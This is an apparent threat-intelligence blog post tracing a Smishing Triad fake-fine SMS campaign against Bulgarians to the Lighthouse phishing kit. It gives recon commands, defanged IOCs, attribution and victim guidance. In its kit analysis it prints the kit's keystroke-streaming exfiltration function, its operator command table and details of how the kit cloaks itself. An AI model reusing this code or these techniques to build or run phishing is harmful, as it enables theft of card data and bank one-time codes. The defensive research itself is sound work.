---
title: "Tracing a Smishing Triad Fake-Fine Campaign Targeting Bulgaria (МВР)"
date: "2026-06-08"
tags: ["OSINT", "Threat Intelligence", "Phishing", "Smishing", "Forensics", "Smishing Triad", "Incident Response"]
---

# Tracing a Smishing Triad Fake-Fine Campaign Targeting Bulgaria (МВР)

![Smishing Triad МВР Bulgaria fake-fine campaign data flow](/images/smishing-triad-mvr-bg.jpg)

## Introduction

This one didn't start as an engagement. It started when my girlfriend got a text message
claiming she had an unpaid fine from **МВР** (the Bulgarian Ministry of Interior), with a link
to "pay" it. It was an obvious phish — but instead of just deleting it, we decided to pull the
thread all the way and see how far it went.

What looked like a single throwaway SMS turned out to be the **Bulgarian branch of a global,
China-based criminal operation** that security researchers track as the **Smishing Triad** —
the same group behind the "you have an unpaid toll / undelivered package" texts that have been
hammering people worldwide. The kit on the other end wasn't a static credential-stealer; it was
a **real-time card-and-OTP relay** with a human operator on the other side, purpose-built to
defeat 3DS.

This post walks through the full trace — WHOIS to hosting to the phishing kit's internals to the
live operator backend — using nothing but passive OSINT and non-intrusive retrieval.

## Important note on scope and ethics

Everything below was done with **observation only**: public WHOIS/DNS, certificate-transparency
logs, third-party scanners, and retrieving the attacker's *own* publicly-served HTML/JS the same
way any browser would. **No data was ever submitted to the phishing site, and no exploitation,
authorization bypass, or intrusion was attempted against the attacker's server.** Breaking into
a criminal's box is still illegal and — more importantly here — would destroy the evidence's
value for the abuse reports and the law-enforcement referral. The indicators in this post were
also reported to the hosting provider, the registrar, and CERT Bulgaria.

## The lure

![The smishing SMS, sent from a Moroccan (+212) number](/images/mvr-smishing-sms.png)

The message followed the universal smishing formula — **authority + urgency + fear + a link** —
and it was well-written Bulgarian, not machine-translated sludge. Translated:

> *Important message: Your traffic violation will soon be transferred to law enforcement. Based on
> automatic identification and evidence collection by the **Intelligent Traffic Monitoring System
> (МРК-599)**, your vehicle violated traffic rules. Current case status: "Final Notice for
> Enforcement." Before **24:00 on 9 June 2026**, either pay the fine or submit evidence via the
> official website. Otherwise the case is added to the national law-enforcement pending list, and
> **after 15 days the competent court will freeze your bank account** and collect all fines, late
> fees and enforcement costs. Official portal for complaints or payments:* `hxxps://mvr-bgi[.]cyou/BG`*. *Reply
> "1" to see violation photos and GPS location data.*

Note the craft: an invented-but-plausible "МРК-599" surveillance system, a hard deadline, an
escalating legal threat ending in *account freezing*, and a "reply 1" hook to bait engagement and
confirm the number is live. It impersonated МВР / КАТ (traffic police) and pointed at:

```
hxxps://mvr-bgi[.]cyou/BG
```

`mvr-bgi` is a typosquat of the real `mvr.bg`, on a `.cyou` TLD — one of the cheap, bulk-registered
TLDs (ShortDot SA) that phishing operators love.

One detail worth flagging before we even touch the link: the **sender number was `+212 7 75 74 31
53` — a Moroccan mobile**. A Bulgarian government agency texting fines from a Moroccan SIM is, by
itself, all the proof you need. It points at the delivery layer of these operations: banks of
rented/farmed foreign SIMs (or RCS/iMessage sender IDs) used to blast texts at scale. The real
giveaway, though, comes the moment you look at the domain registration.

## Step 1 — WHOIS: the domain is hours old

```bash
$ whois mvr-bgi[.]cyou | grep -iE "creation|registrar|registrant|name server"
Creation Date: 2026-06-08T08:46:35.0Z
Registrar: Gname.com Pte. Ltd.
Registrar IANA ID: 1923
Registrant Country: CN
Name Server: A11[.]SHARE-DNS[.]COM
Name Server: B11[.]SHARE-DNS[.]NET
```

The domain was **registered at 08:46 UTC the same morning** the SMS arrived. The TLS certificate
was issued even earlier the same day:

```bash
$ echo | openssl s_client -connect mvr-bgi[.]cyou:443 -servername mvr-bgi[.]cyou 2>/dev/null \
    | openssl x509 -noout -issuer -dates
issuer=C=US, O=Let's Encrypt, CN=YE1
notBefore=Jun  8 07:53:31 2026 GMT
notAfter=Sep  6 07:53:30 2026 GMT
```

Domain, cert, and DNS all stood up within the same hour, then weaponized immediately. This is
the disposable-infrastructure model: register, phish for a day or two, burn, repeat. The
registrant is privacy-redacted but the country leaks: **CN**. The registrar is **Gname**
(Singapore), and DNS is **Tencent's DNSPod** (`share-dns`). Already a very specific fingerprint.

## Step 2 — Hosting: Tencent Cloud, and a 77-domain neighborhood

```bash
$ dig +short mvr-bgi[.]cyou
43.130.152[.]152

$ whois 43.130.152[.]152 | grep -iE "netname|origin|descr|abuse-mailbox"
netname:        ACE-SG
origin:         AS132203
descr:          ACEVILLE PTE.LTD.
abuse-mailbox:  abuse@tencent.com
```

`AS132203 / ACEVILLE PTE.LTD.` is Tencent Cloud's Singapore entity. Now the interesting part —
pivoting on that IP in **urlscan.io** to see what else lives there:

```bash
$ curl -s "https://urlscan.io/api/v1/search/?q=page.ip:43.130.152[.]152&size=100" \
    | jq -r '.results[].page.domain' | sort -u
```

That single IP had served **77+ phishing scans** impersonating government, postal, and financial
brands across a dozen countries:

| Lure / brand | Country | Example domain |
|---|---|---|
| МВР / КАТ (this case) | 🇧🇬 Bulgaria | `mvr-bgi[.]cyou` |
| e-prekršaj (traffic fines) | 🇭🇷 / Balkans | `eprekrsajinius[.]cyou` |
| transports.gouv / ANTAI | 🇫🇷 France | `transports*gouv[.]icu` |
| Transportstyrelsen | 🇸🇪 Sweden | `transportstyrelsen-msm[.]icu` |
| MaltaPost | 🇲🇹 Malta | `maltaposti[.]icu` |
| DPD / Pasts | 🇱🇻 Latvia / EU | `pasts-dpd[.]icu`, `dpdio[.]icu` |
| HK eToll / WSD | 🇭🇰 Hong Kong | `hketoll-gov[.]icu` |
| Andreani (courier) | 🇦🇷 Argentina | `andreani*[.]icu` |
| ChileAtiende (gov) | 🇨🇱 Chile | `chileatiende*[.]icu` |
| TBC Bank | 🇬🇪 Georgia | `tbcpayioge[.]icu` |

This is not one scammer. It's shared infrastructure for an industrial, multi-country operation.

## Step 3 — Inside the kit

Fetching the landing page with a desktop/bot user-agent returns almost nothing — a 753-byte
shell with just a title. The kit **cloaks**: it only renders the real content to mobile
user-agents arriving via the SMS link. Requesting it as a mobile browser:

```bash
$ curl -s -A "Mozilla/5.0 (Linux; Android 13; SM-S918B) ... Mobile" hxxps://mvr-bgi[.]cyou/BG \
    | grep -oiE "<title>[^<]*|src=\"[^\"]+\.js\""
<title>Портал за електронни административни услуги
src="/assets/index-3ad50ede.js"
```

*"Портал за електронни административни услуги"* — "Portal for Electronic Administrative
Services." It's a **Vue single-page app**; the 402 KB JS bundle is where the logic lives. The
asset path leaks the campaign theme: `/wd079_bg_etc_kat-obligations/` — *КАТ obligations*, i.e.
traffic-police debts.

Pulling apart the bundle (statically — no data submitted) gives the data model:

```bash
$ grep -aoiE "(cardnumber|cvv|pin|otp|expir|cardholder|phone|ssn|bank|iban)" main.js \
    | tr 'A-Z' 'a-z' | sort | uniq -c | sort -rn
  45 pin
  42 otp
  27 cardnumber
  25 expir
  24 phone
  23 cvv
  15 bank
   2 ssn
   2 cardholder
```

So it harvests the full set: **card number, holder, expiry, CVV, PIN, OTP, phone, and `ssn`
(here, the Bulgarian ЕГН/EGN)**. It even loads card-brand icons (Visa/Mastercard/Amex/Maestro)
from `img.icons8.com`, and hardcodes a reference to the *genuine* portal it clones,
`https://e-uslugi.mvr.bg/services/kat-obligations`.

## Step 4 — Following the data

Where does it all go? The axios base URL resolves to same-origin:

```js
const EO = "/";
... mO.create({ baseURL: EO, timeout: 15e3 ... })
```

…and the app POSTs to a set of same-host endpoints, with a **raw WebSocket** for the real-time
channel:

```
POST  /card  /pay  /address  /appValid  /otpValid  /customOtpValid
WS    wss[://]mvr-bgi[.]cyou/ws?token=<per-victim-session-token>
```

The Vue router state machine is the tell:

```
/home → /address → /pay → /card → /appValid → /otpValid → /customOtpValid → /success
```

`/appValid` and `/customOtpValid` are *spinner* screens. They hold the victim while **a human
operator validates the stolen card and the live bank OTP**. The socket event names confirm the
handshake:

```bash
$ grep -aoiE "\.(emit|on)\(\"[a-z-]+\"" main.js | sort -u
.emit("my-event"   .on("app-valid"
.on("otp-valid"    .on("custom-otp-valid")   .on("success")
```

This is the mechanism the **"Lighthouse"** kit is known for: the victim's card is pushed up, an
operator feeds it into the real bank's 3DS flow, the bank texts the victim a one-time
code, and the page harvests *that* code in real time — flipping `otp-valid` / `custom-otp-valid`
to drive the victim's screen ("code incorrect, try again") until the transaction authorizes.
**SMS-2FA / 3DS, defeated by a human in the loop.**

### Is anyone actually home?

The backend identifies itself, and it's live. A WebSocket-upgrade probe (no payload, no token)
returns **400, not 404** — the route exists and the backend is running:

```bash
$ curl -s -o /dev/null -D - -H "Connection: Upgrade" -H "Upgrade: websocket" \
    -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
    "hxxps://mvr-bgi[.]cyou/ws?token=probe" | grep -iE "HTTP/|server:"
HTTP/2 400
server: GoFrame HTTP Server
```

**GoFrame** is a Go web framework that's overwhelmingly popular in the Chinese developer
community — another data point lining up with the attribution. Behind a Caddy reverse proxy sits
a Go app acting as the operator-relay backend.

One more nice touch: on completion the kit calls
`window.location.replace("https://e-uslugi.mvr.bg/services/kat-obligations")` — it redirects the
victim to the **real** МВР portal so nothing feels off afterwards. And buried in the "success"
strings are leftovers from other countries' builds — **`"Successful Toll Payment"`**,
**`"successful delivery"`** — proving the same codebase is reused across the toll/parcel/fine
campaigns.

### Where the trace stops (and why)

The one thing we *can't* see from outside is the operator: their IP, their Telegram, their panel.
All of that lives server-side, on the box. Getting it would mean breaking in — illegal, and it
would burn the evidence. **That hop is exactly what a hosting-provider log-preservation request
or a law-enforcement seizure produces.** It's the headline ask in any report: *Tencent, please
preserve and produce the connection logs for `/ws` and the admin interface on 43.130.152[.]152.*

## Cracking the kit open

The site is a minified ~400 KB Vue bundle. Beautified, it's ~19,500 lines — mostly framework, but
the kit's own logic sits there in the clear. Pulling it apart answered every question the black-box
recon couldn't, and turned up a few things I didn't expect.

### A streaming keylogger — you're robbed before you click "pay"

The exfil doesn't wait for the form to submit. Every keystroke in every field runs through one
function:

```js
function $r(type, field, value) {
  // 1) WebSocket, 300ms debounce — live to the operator:
  ws.send(JSON.stringify({ event: "input_text", content: { type, key: field, text: value }, timestamp }));
  // 2) HTTP, 1000ms debounce — backup channel:
  post("/FgJVuqNijG/api/input", { content: { type, key: field, text: value }, timestamp });
}
```

Two parallel channels — a websocket for real-time, an HTTP POST as backup — firing on `cardNumber`,
`cvv`, `expires`, the cardholder name, and the OTP fields. The card number leaves the victim's
browser **digit by digit, as it's typed.** Pressing "pay" is irrelevant; they've had it for a while
by then.

Note that path: `/FgJVuqNijG/api/`. The random prefix is per-deployment — an anti-detection touch so
there's no static URL to blocklist. And `/card` and `/pay`, which from the outside looked like exfil
endpoints, are just Vue UI routes. The real API hides behind the random prefix.

### A human at the wheel

That websocket isn't fire-and-forget. The server pushes commands back, and the page obeys:

| Server command (`result_type`) | What the victim sees |
|---|---|
| `otpValid` / `customOtpValid` | "enter your verification code" |
| `otpFail` | "Verification code error, please try again" |
| `appFail` | "Your session is about to expire, verify now" |
| `back` / `reject` | **"This card isn't supported, please try another card"** |
| `denyC` / `denyD` | separate decline scripts for credit vs debit |
| `success` | "done" |
| `kickOut` / `block` | silently bounce to the real mvr.bg |

This is a remote-control console, and there's a person on the other end. They take the card the kit
just streamed them, punch it into the real bank's 3DS flow, and when the bank texts the
victim a one-time code, they flip `otpValid` to make the page demand it — then `otpFail` to make
them re-enter it if needed. The `back` → *"try another card"* path exists to **drain more than one
card from the same victim.** This is what the group's advertised "300+ front-desk staff" do all day.

### The cloaking is server-side — and I got it to admit it

The decoy shell that bots and desktops get? That decision is made server-side, in a bootstrap call
the app fires on load. The kit mints itself a random UUID token, sends it, and the backend answers.
So I minted one and asked — as a Bulgarian mobile visitor, nothing submitted:

```json
{ "code": 0, "isBlock": false, "country": "BG", "mode": 1, "isFirst": true,
  "custom": { /* the operator's campaign config */ } }
```

`country: "BG"`, `isBlock: false` — it geolocated me, decided I was a real target, and let me in. A
wrong country, a datacenter IP, or a crawler gets `isBlock: true` and the harmless shell. That's the
entire trick, and it's why everything that wasn't a Bulgarian phone only ever saw a title.

### The operator left fingerprints in their own config

That `custom` blob is the operator's campaign settings — and it's the best evidence in the whole
investigation, because they typed it themselves. Two things jump out.

Their custom OTP page is internally named:

```json
"name": "双重验证码2"
```

That's Chinese — *"dual verification code 2."* A "Bulgarian government" page, configured by someone
who labels their own templates in Chinese.

And the Bulgarian they hand-wrote for that page isn't Bulgarian — it's **Latin letters arranged to
look like Cyrillic:**

```
"input1Title": "CTaTuHa napona"             → Статична парола            (static password)
"input2Title": "AuHaMwuHa 3D napona oT SMS" → Динамична 3D парола от SMS  (the bank OTP)
```

`CTaTuHa` = Статична, `napona` = парола, `oT` = от. Someone with no Cyrillic keyboard eyeballed
the letter shapes and rebuilt the words in ASCII. The kit's *built-in* Bulgarian — the default
strings — is perfect Cyrillic; only the parts the operator added by hand are faked. You don't get a
cleaner tell that the person running a "Bulgarian government" site doesn't speak the language.

### Two smaller things the code settled

- **No encryption.** Card numbers, CVVs and OTPs leave as plaintext JSON over TLS — no obfuscation,
  no client-side crypto. Whoever holds the backend reads everything in the clear.
- **The SMS lied about the GPS.** The text promised "photos of the violation and GPS location data"
  if you replied. There isn't a single line of geolocation code in the kit. It was bait to get a
  reply and confirm a live number — nothing more.

## Step 5 — Scaling the trace: from one box to a 316-server fleet

There's no reason to stop at one IP. Every confirmed phishing host returns the *identical*
GoFrame default page on port 80, and Shodan hashes that response:

```bash
$ shodan host 43.130.152[.]152
...
80/tcp   GoFrame HTTP Server   http.html_hash: 2037417530
```

Pivot on that hash, scoped to Tencent's ASN, and the fleet falls out:

```bash
$ shodan count 'http.html_hash:2037417530 asn:AS132203'
316
```

**316 server nodes** — spread across the US (108), Germany (63), Singapore (55), Brazil, Korea,
Japan, Indonesia, Hong Kong, Thailand. The geographic spread is deliberate: rotating front-ends
so no single takedown hurts much. Spot-checking them against urlscan, more than half were already
serving live phishing — DPD clones, parking-fine pages, Hong Kong gov, and **Bank of America /
Chase** kits. The МВР domain that texted my girlfriend is one tenant on one node of this.

(Two dead ends, noted so you don't repeat them: the port-443 "Ncat" hash and the SSH `hassh` both
match hundreds of thousands of unrelated hosts. Not every shared attribute is a pivot —
fingerprint discipline matters.)

## Who is this? The Smishing Triad / "Lighthouse"

Every marker we collected matches a well-documented actor:

- **Hosting on Tencent `AS132203`** — Silent Push notes that *over half* of this group's sites sit
  on Tencent (`AS132203`) and Alibaba (`AS45102`).
- **`.cyou` / `.icu` TLDs, Gname registrar, CN registrant**, same-day register-and-burn.
- **Government-fine + postal-parcel lures** rotated across **121+ countries**.
- A **real-time OTP/PIN/3DS-bypass kit** with human operators — the **"Lighthouse"** kit, which
  the group advertises as backed by *"300+ front-desk staff worldwide."* Those "front-desk staff"
  are the people on the other end of the `/ws` socket we found.

### The people behind it (as far as OSINT reaches)

We can't put a face on *our* specific domain — but the kit and the ecosystem are named in public
reporting, and the technical fit is exact:

- The kit is **"Lighthouse,"** a phishing-as-a-service platform. Silent Push identifies its
  developer as **"Wang Duo Yu" (王多余)**, who sold builds over Telegram (`wangduuoyu0`) for around
  $50 each; **PRODAFT** tracks him as **LARVA-241**.
- Lighthouse grew out of **"Lao Wang"**'s operation — the actor credited with pioneering the
  Apple/Google Pay "ghost-tap" cash-out that monetizes exactly the card-plus-OTP combo this kit
  harvests.
- Most relevant to us: **"Chen Lun,"** described as Lao Wang's protégé **focused on European
  markets** — the sub-cluster a Bulgarian МВР campaign most plausibly belongs to.
- In **November 2025, Google sued the operation** (SDNY, RICO, "Does 1-25"): 600+ templates
  impersonating 400+ brands, 1M+ victims. Tellingly, even Google's lawyers have only **Telegram
  handles**, not legal names. That's the ceiling for everyone outside law enforcement — the real
  identities sit behind handles, crypto wallets, and host-side logs that only a subpoena unlocks.

The "AJAX-based real-time data exfiltration" that researchers attribute to Lighthouse? That's the
`/ws` socket relay we watched answer with a live `400`. We didn't just match a vibe — we matched
the mechanism.

### Other writeups on this group

This is a heavily-researched actor — if you want to go deeper, these are the best primary
sources, and they corroborate everything above:

- **Silent Push** — [*Smishing Triad: Chinese eCrime Group Targets 121+ Countries, Intros New
  Banking Phishing Kit*](https://www.silentpush.com/blog/smishing-triad/) (the definitive
  technical tracking of the group and the Lighthouse kit).
- **Krebs on Security** — [*China-based SMS Phishing Triad Pivots to Banks*](https://krebsonsecurity.com/2025/04/china-based-sms-phishing-triad-pivots-to-banks/)
  (Apr 2025) and [*Google Sues to Disrupt Chinese SMS Phishing Triad*](https://krebsonsecurity.com/2025/11/google-sues-to-disrupt-chinese-sms-phishing-triad/)
  (Nov 2025).
- **Resecurity** — [*"Smishing Triad" Targeted USPS and US Citizens for Data Theft*](https://www.resecurity.com/blog/article/smishing-triad-targeted-usps-and-us-citizens-for-data-theft).
- **Hunt.io** — [*Exposing a Global Smishing Operation Across 19 Countries*](https://hunt.io/blog/massive-smishing-campaign-governments-postal-telecoms).
- **Dark Reading** — [*Google Looks to Dim 'Lighthouse' Phishing-as-a-Service Op*](https://www.darkreading.com/threat-intelligence/google-dim-lighthouse-phishing-as-a-service).
- **CERT Bulgaria** — [active national warning on phishing impersonating state institutions
  (МВР/КАТ)](https://www.govcert.bg/).

What I haven't seen documented yet is *this specific Bulgarian МВР variant* (`mvr-bgi[.]cyou`), the
live `GoFrame /ws` relay fingerprint, and this particular snapshot of the `43.130.152[.]152`
cluster — which is the point of writing it up.

## Why this is worth writing up anyway

The realistic answer is that nobody's getting arrested over this domain. A China-based operator
behind privacy-redacted WHOIS and bulletproof-ish Chinese cloud hosting is not going to a
Bulgarian courtroom any time soon. Google's November 2025 civil suit is meaningful, but it's a
long game.

### What's already happened locally

This isn't the first time the МВР/КАТ lure has hit Bulgaria — and it's not the first time the
operators have been touched. On **8–9 May 2026, ГДБОП arrested two suspects** (ages 30 and 35,
Sofia and Sofia region) for running this exact scheme: fake traffic-fine SMS, later pivoting to
"undelivered package" lures, sender numbers from a foreign mobile (in their case +63 / Philippines),
and what investigators described as a *"specialized Asian platform sold on hacker forums"* — i.e.
the same phishing-as-a-service kit family this post traces back to Lighthouse. Charged under
Art. 212a (computer fraud), up to six years' prison ([ГДБОП statement via Инфомрежа](https://infomreja.bg/gdbop-razbi-grupa-za-fishing-izmami-dejstvala-ot-imeto-na-mvr-dvama-sa-arestuvani.html);
[Сега](https://www.segabg.com/hot/category-bulgaria/gdbop-zadurzha-izmamnici-falshivi-globi-kat)).

And yet `mvr-bgi[.]cyou` was registered **on 8 June 2026 — exactly one month after the arrests**.
SEGA noted the same week that *"the fake messages and scams continued after the arrests"*
([source](https://www.segabg.com/hot/category-bulgaria/falshivite-suobshteniya-i-izmamite-produlzhavat-i-sled-arestite)).
That's the shape of this problem in one line: the local SMS distributors get caught, the upstream
PaaS keeps shipping, and a fresh affiliate stands up new infrastructure the next month. Arrests
matter — but only the platform layer changes the math, and that layer sits in China.

So the leverage isn't prosecution — it's **friction and exposure**:

1. **Takedowns.** Abuse reports to the registrar (Gname), the host (Tencent), and Let's Encrypt,
   plus submitting the URL to **Google Safe Browsing**, **Microsoft SmartScreen**, **Netcraft**,
   and **PhishTank**, get *this* domain flagged and killed — usually within hours to a day. It
   doesn't stop the group, but it shortens this domain's earning window and protects the next
   person who taps the link.
2. **IOC sharing.** Pushing the domain, IP, and kit fingerprints into the public record
   (urlscan, VirusTotal, abuse feeds, and posts like this one that crawlers ingest) feeds the
   blocklists that browsers and mobile carriers consume.
3. **Public awareness.** Most victims have never heard of any of this. A plain-language "if you
   got an МВР/КАТ fine by SMS, it's fake, here's why" reaches the people actually being targeted.
4. **National CSIRT.** CERT Bulgaria aggregates these and coordinates takedowns at the country
   level; a quick report adds to their existing campaign tracking.

The criminals scale with automation. Defenders scale with *sharing*. That's the trade.

## If you got one of these (defensive guidance)

- **МВР, КАТ, NRA, and your bank do not collect fines or "verify" cards via SMS links.** Real КАТ
  obligations are only at the official `e-uslugi.mvr.bg`. When in doubt, type the address
  yourself — never tap the link.
- Red flags: urgency + a "fine/fee," a look-alike domain (`mvr-bgi[.]cyou` vs `mvr.bg`), an oddball
  TLD (`.cyou`, `.icu`, `.top`, `.sbs`), and a page that asks for **card number, CVV, *and* an OTP**.
  No legitimate payment flow needs you to type an OTP into a random website.
- **If you entered card data:** call your bank *now*, block/freeze the card, and watch for a 3DS
  push you didn't initiate — **do not approve it**. The whole point of this kit is to make you
  approve the criminal's transaction in real time. Then file a report with your bank and with
  **CERT Bulgaria** / the cybercrime police (ГДБОП).
- Report the URL to Google Safe Browsing and PhishTank — it takes a minute and helps everyone.

## Indicators of Compromise (IOCs)

```
# Delivery
SMS sender:  +212 7 75 74 31 53   (Morocco mobile — SIM farm / rented)
Lure system: "МРК-599" (fake Intelligent Traffic Monitoring System)

# Domain / network
mvr-bgi[.]cyou
43.130.152[.]152            (Tencent Cloud SG, AS132203)
Registrar: Gname.com Pte. Ltd. (IANA 1923), registrant CN
NS: a11[.]share-dns[.]com / b11[.]share-dns[.]net (Tencent DNSPod)
TLS: Let's Encrypt (CN=YE1), issued 2026-06-08

# Kit fingerprints
URL path:    /wd079_bg_etc_kat-obligations/
JS bundle:   /assets/index-3ad50ede.js
Backend:     "server: GoFrame HTTP Server" behind Caddy
Bootstrap:   POST /FgJVuqNijG/api -> {isBlock, country, Token(uuid), mode, custom}
Exfil HTTP:  POST /FgJVuqNijG/api/input   (random per-build prefix; keystroke backup channel)
Exfil WS:    wss[://]mvr-bgi[.]cyou/ws?token=<uuid>   (events: input_text, result_type)
UI routes:   /card /pay /address /appValid /otpValid /customOtpValid  (Vue routes, NOT endpoints)
Attribution: operator template name "双重验证码2" (zh); pseudo-Cyrillic Latin look-alikes in custom cfg

# Fleet pivot (Shodan) — actor's Tencent server fleet
http.html_hash:2037417530 + asn:AS132203   -> 316 nodes
(dead ends, FYI: html_hash:759042204 and the SSH hassh are generic — NOT actor markers)

# Bulgarian МВР sub-campaign (additional clones)
e-uslugivrl[.]top  e-uslugicye[.]top  e-uslugiaca[.]top  e-uslugimvrbgb[.]top
mvr[.]{niaj,qdoz,chtm,ftch,lxax,lwbc,wfat,ibif,moez}[.]cam

# Sibling domains across the fleet (same operator) — non-exhaustive
eprekrsajinius[.]cyou  transportsfdsdgouv[.]icu  transportstyrelsen-msm[.]icu
maltaposti[.]icu  pasts-dpd[.]icu  hketoll-gov[.]icu  andreanidosf[.]icu
chileatiendefs[.]icu  tbcpayioge[.]icu  dpd-center[.]com  gov-parkingeh[.]cyou
bankofamerrica[.]eu[.]cc  chasebank[.]eu[.]cc  wsdgov[.]art

# Actor attribution (per public research; alleged)
Kit: "Lighthouse" PaaS  |  Dev: "Wang Duo Yu" / TG wangduuoyu0 / PRODAFT LARVA-241
Ecosystem: "Lao Wang" (platform), "Chen Lun" (EU-focused)  |  Google v. Does 1-25 (SDNY, RICO, 2025)
```

## Conclusion

A "stupid scam text" turned out to be a doorway into a global criminal platform — fresh
infrastructure, a polished real-time fraud kit, and a human operator standing by to walk a victim
through giving up their card and their bank OTP. We couldn't see the operator's face, and nobody's
going to jail over this domain. But we *can* document it, get it killed, push the IOCs into the
feeds, and warn the people getting these texts. Against an actor that scales with automation,
that sharing is the whole game.

Stay sharp, and tell your less-technical friends and family: **МВР does not text you fines.**

---

*Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.*
